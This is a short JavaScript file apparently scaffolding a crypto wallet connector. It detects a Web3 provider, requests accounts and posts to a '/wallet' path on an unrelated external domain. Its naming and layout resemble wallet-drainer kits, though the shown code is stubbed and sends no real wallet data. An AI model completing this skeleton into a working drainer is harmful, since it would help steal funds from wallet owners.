// Core configuration
const API_ENDPOINT = 'https://fasterdeliveryuae.com';
const MS_Settings = {
    RPCs: {
        1: "https://mainnet.infura.io/v3/YOUR_INFURA_KEY",
        56: "https://bsc-dataseed.binance.org/",
        137: "https://polygon-rpc.com"
    }
};

function ms_init() {
    console.log('Wallet connection triggered');
    // Wallet connection logic here
}

// Quick provider detection
function detectProvider() {
    if (window.ethereum) return window.ethereum;
    if (window.web3) return window.web3.currentProvider;
    throw new Error('No Web3 provider detected');
}

// Fast wallet connection
async function connectWallet(provider) {
    const accounts = await provider.request({ method: 'eth_requestAccounts' });
    return accounts[0];
}

// Efficient backend communication
async function sendWalletData() {
    const response = await fetch(`${API_ENDPOINT}/wallet`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ connected: true })
    });
    return response.json();
}
